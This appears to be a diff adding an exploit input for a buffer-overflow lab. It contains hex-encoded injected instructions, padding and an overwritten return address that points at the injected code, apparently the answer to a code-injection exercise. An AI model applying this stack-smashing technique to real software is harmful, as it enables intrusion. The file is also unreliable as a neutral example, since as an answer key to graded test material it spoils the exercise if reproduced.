@@ -1,0 +1,6 @@
+48 c7 c7 22 a1 c5 3f /* mov    $0x3fc5a122,%rdi */
+48 c7 c0 a4 1b 40 00 /* mov    $0x401ba4,%rax */
+48 89 04 24 /* mov    %rax,(%rsp) */
+c3 /* retq */
+aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa /* padding */
+08 a9 60 55 /* exploit code start address */
